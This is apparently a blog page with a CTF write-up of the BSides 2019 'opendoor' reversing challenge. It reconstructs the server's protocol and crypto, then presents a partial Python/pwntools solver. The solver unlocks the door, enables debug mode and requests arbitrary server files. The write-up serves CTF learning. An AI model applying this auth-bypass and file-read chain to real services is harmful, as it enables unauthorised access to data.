@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?port=1313&amp;mindelay=10&amp;v=2" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='BSides CTF 2019'><title>BSides CTF 2019 - opendoor</title>
+
+<link rel='canonical' href='http://localhost:1313/post/bsides-ctf-2019-opendoor/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='BSides CTF 2019 - opendoor'>
+<meta property='og:description' content='BSides CTF 2019'>
+<meta property='og:url' content='http://localhost:1313/post/bsides-ctf-2019-opendoor/'>
+<meta property='og:site_name' content='x0r19x91&#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='reversing' /><meta property='article:published_time' content='2019-03-06T00:00:00&#43;05:30'/><meta property='article:modified_time' content='2019-03-06T00:00:00&#43;05:30'/>
+<meta name="twitter:title" content="BSides CTF 2019 - opendoor">
+<meta name="twitter:description" content="BSides CTF 2019">
+    </head>
+    <body class="">
+        <div class="container flex on-phone--column align-items--flex-start extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+
+                
+                    
+                    <img src="/img/avatar_huda2458f72ce188392d75c5d51cd8e24e_373_300x300_resize_box_2.png" width="300"
+                        height="300" class="site-logo" loading="lazy" alt="Avatar">
+                
+
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="http://localhost:1313/">x0r19x91&#39;s blog</a></h1>
+        <h2 class="site-description">My little corner in the web</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="http://localhost:1313/" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            
+                <a href="/categories/reversing/">reversing</a>
+            
+        
+            
+                <a href="/categories/ctf/">ctf</a>
+            
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/post/bsides-ctf-2019-opendoor/">BSides CTF 2019 - opendoor</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        BSides CTF 2019
+    </h3>
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">Mar 06, 2019</time>
+    </footer></div>
+</header>
+
+    <section class="article-content">
+    <p>This one is a pretty interesting challenge. My solution is just static analysis.</p>
+<p>But before jumping into <strong>main</strong>, I&rsquo;ll be analyzing the <strong>opendoor</strong> namespace</p>
+<p><img src="/images/bsides/buffer_constr.png" alt="buffer_const"  /></p>
+<p>So, the class <strong>Buffer</strong> has two members; a vector of bytes and a offset indicating where to start the next read</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">    <span style="color:#6ab825;font-weight:bold">namespace</span> opendoor {
+        <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">Buffer</span> {
+            shared_ptr&lt;vector&lt;byte&gt;&gt; m_buffer;
+            <span style="color:#6ab825;font-weight:bold">int</span> m_offset;
+        <span style="color:#6ab825;font-weight:bold">public</span>:
+            Buffer() {
+                m_buffer = make_shared(vector&lt;byte&gt;);
+                m_offset = <span style="color:#3677a9">0</span>;
+            }
+            <span style="color:#999;font-style:italic">// ...
+</span><span style="color:#999;font-style:italic"></span>        };
+    };
+</code></pre></div><p>Now lets analyze the <strong>Buffer::read&lt;T&gt;</strong> functions. This is important as it tells how the server unmarshalls the data.<br>
+<strong>Buffer::read&lt;bool&gt;</strong> is a wrapper to <strong>Buffer::read&lt;uchar&gt;</strong>.<br>
+Int32 and Int64 are being read in <strong>BigEndian</strong></p>
+<p><img src="/images/bsides/read_long.png" alt="read_long"  /></p>
+<p>i.e., var_20[7 - var_14] = Buffer::read&lt;uchar&gt;()</p>
+<p><strong>read&lt;shared_ptr&lt;vector&lt;uchar&gt;&gt;&gt;</strong> and <strong>read&lt;string&gt;</strong> work the same. The first call <strong>read&lt;uint&gt;</strong> to read the no. of. bytes and <strong>read&lt;uchar&gt;</strong> to read that many bytes i.e., a vector is a string of bytes prefixed by its length</p>
+<p><img src="/images/bsides/aes_crypter_constr.png" alt="aes_const"  /></p>
+<p>The constructor of <strong>AESCrypter</strong> calls the superclass constructor, before initializing the members. <strong>AESCrypter::decrypt</strong> and <strong>AESCrypter::encrypt</strong> perform decryption and encryption using AES 256 CBC.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">    <span style="color:#6ab825;font-weight:bold">namespace</span> opendoor {
+        <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">Crypter</span> {
+        <span style="color:#6ab825;font-weight:bold">public</span>:
+            <span style="color:#6ab825;font-weight:bold">virtual</span> <span style="color:#6ab825;font-weight:bold">void</span> decrypt(shared_ptr&lt;Buffer&gt;) = <span style="color:#3677a9">0</span>;
+            <span style="color:#6ab825;font-weight:bold">virtual</span> <span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">encrypt</span>(shared_ptr&lt;Buffer&gt;) = <span style="color:#3677a9">0</span>;
+        };
+
+        <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">AESCrypter</span> : <span style="color:#6ab825;font-weight:bold">public</span> Crypter {
+            <span style="color:#6ab825;font-weight:bold">char</span>* key;
+            <span style="color:#6ab825;font-weight:bold">char</span>* iv;
+        <span style="color:#6ab825;font-weight:bold">public</span>:
+            AESCrypter() {
+                key = opendoor::def_key;
+                iv = opendoor::def_iv;
+            }
+            AESCrypter(<span style="color:#6ab825;font-weight:bold">char</span>* k, <span style="color:#6ab825;font-weight:bold">char</span>* i) {
+                key = k; iv = i;
+            }
+            <span style="color:#6ab825;font-weight:bold">void</span>* <span style="color:#447fcf">decrypt</span>(shared_ptr&lt;Buffer&gt; p) {
+                buf = _Decrypt(*p, key, iv);
+                <span style="color:#6ab825;font-weight:bold">return</span> make_shared&lt;Buffer&gt;(buf);
+            }
+            <span style="color:#6ab825;font-weight:bold">void</span>* <span style="color:#447fcf">encrypt</span>(shared_ptr&lt;Buffer&gt; p) {
+                buf = _Encrypt(*p, key, iv);
+                ans = make_shared&lt;Buffer&gt;();
+                ans-&gt;write(buf.size());
+                ans-&gt;write(buf);
+                <span style="color:#6ab825;font-weight:bold">return</span> ans;
+            }
+        };
+    };
+</code></pre></div><p>There is another class that implements <strong>Crypter</strong>. Its the <strong>PlainCrypter</strong>. Well you have guessed it right. Its a dummy class which neither encrypts nor decrypts. It has another parameter which if set to TRUE, prints debug logs.</p>
+<p>Let&rsquo;s move to <strong>opendoor::State</strong> which encapsulates a lock for the magic door.</p>
+<p><img src="/images/bsides/state_constr.png" alt="state_const"  /></p>
+<p>The methods of <strong>State</strong> are straightforward. Here&rsquo;s the representation of <strong>State</strong></p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">    <span style="color:#6ab825;font-weight:bold">namespace</span> opendoor {
+        <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">State</span> {
+            byte m_is_unlocked;
+            byte m_is_debuggable;
+            int32 m_unlock_count;
+            int64 m_door_id;
+        <span style="color:#6ab825;font-weight:bold">public</span>:
+            State() {
+                m_is_unlocked = m_is_debuggable = <span style="color:#3677a9">0</span>;
+                m_unlock_count = <span style="color:#3677a9">0</span>;
+                m_door_id = <span style="color:#3677a9">0x55AA55AA5A5AA5A5</span>;
+            }
+            <span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">unlock</span>() {
+                m_is_unlocked = <span style="color:#3677a9">1</span>;
+                m_unlock_count++;
+            }
+            <span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">lock</span>() {
+                m_is_unlocked = <span style="color:#3677a9">0</span>;
+            }
+            <span style="color:#999;font-style:italic">// getters ...
+</span><span style="color:#999;font-style:italic"></span>        };
+    };
+</code></pre></div><h2 id="the-messaging-protocol">The Messaging Protocol</h2>
+<p>The <strong>Message</strong> class consists of six methods - <strong>parse_message</strong>, <strong>execute</strong>, <strong>to_string</strong>, <strong>serialize</strong>, <strong>ptr</strong>, and <strong>get_id</strong> out of which <strong>parse_message</strong>, <strong>to_string</strong> and <strong>get_id</strong> are pure virtual, i.e., they have to be implemented in the classes implementing <strong>Message</strong>.</p>
+<p>The subclasses of <strong>Message</strong> are of:</p>
+<ol>
+<li>Messages that have a request and response - <strong>UnlockMessage</strong>, <strong>DebugMessage</strong>, <strong>PingMessage</strong></li>
+<li><strong>ErrorMessage</strong></li>
+</ol>
+<p><strong>Message::serialize</strong> performs the common serialization.<br>
+It writes the <em>message_id</em> followed by the <em>timestamp</em> returned by <strong>time()</strong>.</p>
+<p>Now let&rsquo;s go to <strong>Message::ParseMessage</strong></p>
+<p><img src="/images/bsides/msg_parse_msg.png" alt="msg_parse_msg"  /></p>
+<p>It reads two Int32 words i.e., the <strong>message_id</strong> and <strong>timestamp</strong> and checks if the recieved timestamp bounded by <strong>5 seconds</strong> of the current timestamp. Otherwise it responds with an <strong>INVALID_TIMESTAMP</strong> ErrorMessage. I&rsquo;ll discuss later how I got error constant names.</p>
+<p>The generic parsing routine</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">    ParseMessage(shared_ptr&lt;Buffer&gt; p)
+    {
+        msg_id = p-&gt;read();
+        msg_stamp = p-&gt;read();
+        
+        <span style="color:#999;font-style:italic">// time_in_window(a, b) == return abs(time(NULL)-a) &lt;= b
+</span><span style="color:#999;font-style:italic"></span>        
+        <span style="color:#6ab825;font-weight:bold">if</span> (! time_in_window(msg_stamp, <span style="color:#3677a9">5</span>))
+        {
+            err = <span style="color:#6ab825;font-weight:bold">new</span> ErrorMessage(INVALID_TIMESTAMP);
+            <span style="color:#6ab825;font-weight:bold">return</span> err-&gt;ptr();
+        }
+        f = messages_map.find(msg_id)
+        <span style="color:#6ab825;font-weight:bold">if</span> (f == messages_map.end())
+        {
+            err = <span style="color:#6ab825;font-weight:bold">new</span> ErrorMessage(INVALID_MESSAGE);
+            <span style="color:#6ab825;font-weight:bold">return</span> err-&gt;ptr();
+        }
+        msg = (f-&gt;second)();
+
+        <span style="color:#999;font-style:italic">// do message specific parse
+</span><span style="color:#999;font-style:italic"></span>        <span style="color:#6ab825;font-weight:bold">if</span> (! msg-&gt;parse_message(p))
+        {
+            err = <span style="color:#6ab825;font-weight:bold">new</span> ErrorMessage(INVALID_PARSE);
+            <span style="color:#6ab825;font-weight:bold">return</span> err-&gt;ptr();
+        }
+    }
+</code></pre></div><p>So, the timestamp must be within 5 seconds.</p>
+<p><strong>Message</strong> also defines 7 lambdas that creates an instance each of the concrete message classes and encapsulates within a <strong>shared_ptr</strong>.</p>
+<h3 id="1-unlockmessage">1. UnlockMessage</h3>
+<p><strong>UnlockMessage::parse_message</strong> reads two Int64 words and stores them in its member variables.</p>
+<p><img src="/images/bsides/unlock_exec.png" alt="unlock_exec"  /></p>
+<p>Clearly, the first member variable must be non zero and the second member variable must equate to <strong>door_number</strong>. The _good branch continues at</p>
+<p><img src="/images/bsides/unlock_exec_2.png" alt="unlock_exec_2"  /></p>
+<p>which unlocks the door and creates an <strong>UnlockResponse</strong>. While the _bad branch, locks the door instead and returns an ACCESS_DENIED <strong>ErrorMessage</strong>.</p>
+<p>Now we can represent <strong>Message</strong> as</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    <span style="color:#6ab825;font-weight:bold">struct</span> Message
+    {
+        int32_t id;
+        int32_t time_stamp;
+        <span style="color:#6ab825;font-weight:bold">union</span> {
+            <span style="color:#6ab825;font-weight:bold">union</span> {
+                UnlockMessage uMsg;
+                DebugMessage dMsg;
+                PingMessage pMsg;
+            } msg;
+            ErrorMessage eMsg;
+        };
+    };
+
+    <span style="color:#6ab825;font-weight:bold">struct</span> UnlockMessage
+    {
+        int64_t do_unlock;
+        int64_t door_no;
+    };
+</code></pre></div><h3 id="2-debugmessage">2. DebugMessage</h3>
+<p><strong>DebugRequestMessage::parse_message</strong>:</p>
+<p><img src="/images/bsides/debug_parse.png" alt="debug_parse"  /></p>
+<p>It reads an Int32 which can be either 1 or 2. If the value read is 1, then it reads a boolean. If the value is 2, it reads a string. These are stored in member variables at offsets +8, +12, +16</p>
+<p><strong>DebugRequestMessage::execute</strong>:</p>
+<p><img src="/images/bsides/debug_exec.png" alt="debug_exec"  /></p>
+<p>If the member at offset +8 is 1 then **DebugRequestMessage::handle_debug_message_** is called. If the value is not 1 and the lock is not debuggable, an **ACCESS_DENIED** Error is returned. Whereas if the value is 2, and the lock is debuggable, **DebugRequestMessage::handle_readfile** is called.</p>
+<p>Thus the member at offset +8, denotes the <em>debug_type</em></p>
+<p>Yay ! This looks promising !</p>
+<p>So, to execute **handle_readfile_**, we must have the lock&rsquo;s **DEBUG** flag turned on. But the lock&rsquo;s debug flag is initially 0.</p>
+<p>**handle_debug_message_**:</p>
+<p><img src="/images/bsides/debug_handle_dbg.png" alt="debug_handle_dbg"  /></p>
+<p>If the member at offset +12 is 1, the routine turns on the door&rsquo;s <strong>DEBUG</strong> flag if the door is unlocked. If the value at offset +12 is not 1, then the door&rsquo;s debug flag is turned off.</p>
+<p>The member at offset +12 denotes the flag for turning on lock&rsquo;s debug flag.</p>
+<p>**handle_readfile_** reads 4K bytes from the file whose path is stored in the member variable at offset +16 and returns the contents.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    <span style="color:#6ab825;font-weight:bold">struct</span> DebugMessage
+    {
+        int32_t debug_type;
+        int8_t b_debug_lock;
+        std::string filePath;
+    };
+</code></pre></div><h2 id="approach">Approach</h2>
+<ol>
+<li>Send <strong>UnlockMessage</strong> to set the lock&rsquo;s status to <strong>UNLOCKED</strong></li>
+<li>Send <strong>DebugMessage</strong> of type 1 to set the lock&rsquo;s <strong>DEBUG</strong> flag</li>
+<li>Send <strong>DebugMessage</strong> of type 2 to read any file !!</li>
+</ol>
+<p>The <strong>ConnectionPool</strong> class uses non-blocking IO. It maintains a map whose keys are the client socket descriptors and values are instances of <strong>ConnectionHandler</strong>. The **do_read_** (**do_write**) methods read (write) a vector of bytes (from the socket) in the same format as **Buffer** reads (writes).</p>
+<p>Here&rsquo;s the vtable for <strong>ConnectionHandler</strong></p>
+<p><img src="/images/bsides/conn_handler_vtable.png" alt="conn_handlr_vtbl"  /></p>
+<p>The members of <strong>ConnectionHandler</strong> are</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">    <span style="color:#6ab825;font-weight:bold">namespace</span> opendoor {
+        <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">ConnectionHandler</span> {
+            <span style="color:#6ab825;font-weight:bold">int32_t</span> socket;                 <span style="color:#999;font-style:italic">/* +0x8 */</span>
+            <span style="color:#6ab825;font-weight:bold">bool</span> b_closed;                  <span style="color:#999;font-style:italic">/* +0xC */</span>
+            <span style="color:#6ab825;font-weight:bold">int32_t</span> read_size;              <span style="color:#999;font-style:italic">/* +0x10 */</span>
+            vector&lt;byte&gt; write_vec;         <span style="color:#999;font-style:italic">/* +0x18 */</span>
+            vector&lt;byte&gt; read_vec;          <span style="color:#999;font-style:italic">/* +0x30 */</span>
+            shared_ptr&lt;Buffer&gt; buffer;      <span style="color:#999;font-style:italic">/* +0x48 */</span>
+            shared_ptr&lt;State&gt; lock;         <span style="color:#999;font-style:italic">/* +0x58 */</span>
+            shared_ptr&lt;Crypter&gt; cryptr;     <span style="color:#999;font-style:italic">/* +0x68 */</span>
+            <span style="color:#999;font-style:italic">// ...
+</span><span style="color:#999;font-style:italic"></span>        };
+    }
+</code></pre></div><p>Let&rsquo;s visit **ConnectionHandler::process_message_**</p>
+<p><img src="/images/bsides/conn_proc.png" alt="conn_proc"  /></p>
+<p>The routine calls <strong>cryptr-&gt;decrypt()</strong> on <strong>buffer</strong>. If the decryption is successful, it proceeds to <strong>ParseMessage</strong></p>
+<p><img src="/images/bsides/conn_proc_2.png" alt="conn_proc_2"  /></p>
+<p>If the message has been parsed successfully, the <strong>execute()</strong> method is invoked. If it succeeds, a positive response is returned by invoking <strong>serialize()</strong> followed by <strong>cryptr-&gt;encrypt()</strong></p>
+<p>Last but not the least, <strong>init</strong></p>
+<p><img src="/images/bsides/init.png" alt="init"  /></p>
+<p>The second routine, sets up the <strong>map</strong>s as follows</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    messages = {
+    <span style="color:#999;font-style:italic"># opendoor::Message::{lambda(void)#i}::operator()</span>
+        <span style="color:#3677a9">1</span>  : <span style="color:#3677a9">0x48900</span>,    <span style="color:#999;font-style:italic"># PingRequest</span>
+        <span style="color:#3677a9">2</span>  : <span style="color:#3677a9">0x48940</span>,    <span style="color:#999;font-style:italic"># PingResponse</span>
+        <span style="color:#3677a9">3</span>  : <span style="color:#3677a9">0x48980</span>,    <span style="color:#999;font-style:italic"># UnlockRequest</span>
+        <span style="color:#3677a9">4</span>  : <span style="color:#3677a9">0x489C0</span>,    <span style="color:#999;font-style:italic"># UnlockResponse</span>
+        <span style="color:#3677a9">5</span>  : <span style="color:#3677a9">0x48A00</span>,    <span style="color:#999;font-style:italic"># DebugRequest</span>
+        <span style="color:#3677a9">6</span>  : <span style="color:#3677a9">0x48A40</span>,    <span style="color:#999;font-style:italic"># DebugResponse</span>
+        -<span style="color:#3677a9">1</span> : <span style="color:#3677a9">0x48A80</span>     <span style="color:#999;font-style:italic"># ErrorMessage</span>
+    }
+
+    error_messages = {
+        <span style="color:#3677a9">0</span>     : <span style="color:#ed9d13">&#34;Unknown&#34;</span>,
+        <span style="color:#3677a9">1</span>     : <span style="color:#ed9d13">&#34;Invalid Message Type&#34;</span>,
+        <span style="color:#3677a9">2</span>     : <span style="color:#ed9d13">&#34;Invalid Timestamp&#34;</span>,
+        <span style="color:#3677a9">3</span>     : <span style="color:#ed9d13">&#34;Error Parsing&#34;</span>,
+        <span style="color:#3677a9">4</span>     : <span style="color:#ed9d13">&#34;Crypto Error&#34;</span>,
+        <span style="color:#3677a9">0x193</span> : <span style="color:#ed9d13">&#34;Access Denied&#34;</span>,
+        <span style="color:#3677a9">0x194</span> : <span style="color:#ed9d13">&#34;Resource Not Found&#34;</span>
+    }
+</code></pre></div><p><strong>main</strong> is also straightforward. It calls <strong>parse_flags</strong> to determine the default <strong>Crypter</strong> instance to be used. The default is <strong>AESCrypter</strong>. If <strong>-n</strong> is specified, <strong>PlainCrypter</strong> is used. The default port is 4848 which can be changed with <strong>-p</strong> option.</p>
+<p>So, we have to write the encrypted <strong>Message</strong> prefixed by the size of the encrypted message to the server.</p>
+<h2 id="source-code">Source Code</h2>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    <span style="color:#999;font-style:italic">#!/usr/bin/python</span>
+
+    <span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">Crypto.Cipher</span> <span style="color:#6ab825;font-weight:bold">import</span> AES
+    <span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">pwn</span> <span style="color:#6ab825;font-weight:bold">import</span> *
+
+    PLAINTEXT = <span style="color:#3677a9">0</span>
+
+    <span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">pad</span>(m):
+        <span style="color:#6ab825;font-weight:bold">return</span> m+<span style="color:#24909d">chr</span>(<span style="color:#3677a9">16</span>-<span style="color:#24909d">len</span>(m)%<span style="color:#3677a9">16</span>)*(<span style="color:#3677a9">16</span>-<span style="color:#24909d">len</span>(m)%<span style="color:#3677a9">16</span>)
+
+    <span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">unpad</span>(s):
+        <span style="color:#6ab825;font-weight:bold">return</span> s[:-<span style="color:#24909d">ord</span>(s[<span style="color:#24909d">len</span>(s)-<span style="color:#3677a9">1</span>:])]
+
+    door_number = <span style="color:#3677a9">0x55AA55AA5A5AA5A5</span>
+    key = <span style="color:#ed9d13">&#39;</span><span style="color:#ed9d13">\x97\x8B\x8B\x8F\x8C\xC5\xD0\xD0\x88\x88\x88\xD1\x8C\x86\x8C\x8B\x9A\x92\x90\x89\x9A\x8D\x93\x90\x8D\x9B\xD1\x9C\x90\x92\xD0\xFF</span><span style="color:#ed9d13">&#39;</span>
+    iv = <span style="color:#ed9d13">&#39;notaflagnotaflag&#39;</span>
+
+    <span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">encrypt</span>(msg):
+        aes = AES.new(key=key, IV=iv, mode=AES.MODE_CBC)
+        ans = aes.encrypt(pad(msg))
+        <span style="color:#6ab825;font-weight:bold">del</span> aes
+        <span style="color:#6ab825;font-weight:bold">return</span> ans
+
+    <span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">decrypt</span>(msg):
+        aes = AES.new(key=key, IV=iv, mode=AES.MODE_CBC)
+        ans = aes.decrypt(msg)
+        <span style="color:#6ab825;font-weight:bold">del</span> aes
+        <span style="color:#6ab825;font-weight:bold">return</span> unpad(ans)
+
+    <span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">i32</span>(i):
+        <span style="color:#6ab825;font-weight:bold">return</span> p32(i, endian=<span style="color:#ed9d13">&#39;big&#39;</span>)
+
+    <span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">i64</span>(i):
+        <span style="color:#6ab825;font-weight:bold">return</span> p64(i, endian=<span style="color:#ed9d13">&#39;big&#39;</span>)
+
+    <span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">pStr</span>(s):
+        <span style="color:#6ab825;font-weight:bold">return</span> i32(<span style="color:#24909d">len</span>(s)) + s
+
+    <span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">debugReq1</span>(f):
+        <span style="color:#6ab825;font-weight:bold">return</span> i32(<span style="color:#3677a9">1</span>) + <span style="color:#24909d">chr</span>(f)
+
+    <span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">debugReq2</span>(f):
+        <span style="color:#6ab825;font-weight:bold">return</span> i32(<span style="color:#3677a9">2</span>) + pStr(f)
+
+    <span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">unlockReq</span>():
+        <span style="color:#6ab825;font-weight:bold">return</span> i64(<span style="color:#3677a9">1</span>) + i64(door_number)
+
+    <span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">msg</span>(msg_id, oMsg):
+        body = i32(msg_id) + i32(<span style="color:#24909d">int</span>(time.time()+<span style="color:#3677a9">2</span>)) + oMsg
+        <span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#6ab825;font-weight:bold">not</span> PLAINTEXT:
+            body = encrypt(body)
+        m = i32(<span style="color:#24909d">len</span>(body)) + body
+        <span style="color:#6ab825;font-weight:bold">return</span> m
+
+    <span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">parse</span>(msg):
+        size = u32(msg[:<span style="color:#3677a9">4</span>], endian=<span style="color:#ed9d13">&#39;big&#39;</span>)
+        <span style="color:#6ab825;font-weight:bold">print</span> <span style="color:#ed9d13">&#34;[*] Message size: </span><span style="color:#ed9d13">%d</span><span style="color:#ed9d13"> bytes&#34;</span> % size
+        msg = msg[<span style="color:#3677a9">4</span>:<span style="color:#3677a9">4</span>+size]
+        <span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#6ab825;font-weight:bold">not</span> PLAINTEXT:
+            msg = decrypt(msg)
+        msg_id = u32(msg[:<span style="color:#3677a9">4</span>], endian=<span style="color:#ed9d13">&#39;big&#39;</span>)
+        <span style="color:#6ab825;font-weight:bold">print</span> <span style="color:#ed9d13">&#34;[*] Message ID: </span><span style="color:#ed9d13">%d</span><span style="color:#ed9d13">&#34;</span> % msg_id
+        time_stamp = u32(msg[<span style="color:#3677a9">4</span>:<span style="color:#3677a9">8</span>], endian=<span style="color:#ed9d13">&#39;big&#39;</span>)
+        <span style="color:#6ab825;font-weight:bold">print</span> <span style="color:#ed9d13">&#34;[*] Timestamp: </span><span style="color:#ed9d13">%d</span><span style="color:#ed9d13">&#34;</span> % time_stamp
+        <span style="color:#6ab825;font-weight:bold">if</span> msg_id == <span style="color:#3677a9">4</span>:
+            uflag = u64(msg[<span style="color:#3677a9">8</span>:<span style="color:#3677a9">16</span>], endian=<span style="color:#ed9d13">&#39;big&#39;</span>)
+            door = u64(msg[<span style="color:#3677a9">16</span>:<span style="color:#3677a9">24</span>], endian=<span style="color:#ed9d13">&#39;big&#39;</span>)
+            <span style="color:#6ab825;font-weight:bold">print</span> <span style="color:#ed9d13">&#34;[ Unlock ] - [ unlock_flag : </span><span style="color:#ed9d13">%d</span><span style="color:#ed9d13">, door_num : </span><span style="color:#ed9d13">%x</span><span style="color:#ed9d13"> ]&#34;</span> % (uflag, door)
+        <span style="color:#6ab825;font-weight:bold">elif</span> msg_id == <span style="color:#3677a9">6</span>:
+            debug_option = u32(msg[<span style="color:#3677a9">8</span>:<span style="color:#3677a9">12</span>], endian=<span style="color:#ed9d13">&#39;big&#39;</span>)
+            <span style="color:#6ab825;font-weight:bold">if</span> debug_option == <span style="color:#3677a9">1</span>:
+                <span style="color:#6ab825;font-weight:bold">print</span> <span style="color:#ed9d13">&#34;[ Debug ] - [ debug_flag : </span><span style="color:#ed9d13">%d</span><span style="color:#ed9d13"> ]&#34;</span> % <span style="color:#24909d">ord</span>(msg[<span style="color:#3677a9">12</span>])
+            <span style="color:#6ab825;font-weight:bold">else</span>:
